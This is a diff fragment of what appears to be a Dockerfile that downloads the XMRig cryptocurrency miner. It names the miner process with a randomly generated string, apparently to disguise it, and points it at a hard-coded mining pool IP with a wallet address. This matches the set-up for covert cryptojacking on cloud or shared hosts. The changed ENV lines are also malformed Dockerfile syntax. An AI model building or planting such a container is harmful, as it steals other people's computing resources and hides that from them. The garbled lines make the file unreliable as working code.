@@ -8,7 +8,7 @@ RUN a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n
 RUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
 RUN tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
 ENV mv xmrig $azure -n
-ENV $azure "$cpuname"
+ENV cp $azure "$cpuname"
 
 ENV POOL 158.101.6.131:2222
 ENV USERNAME WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
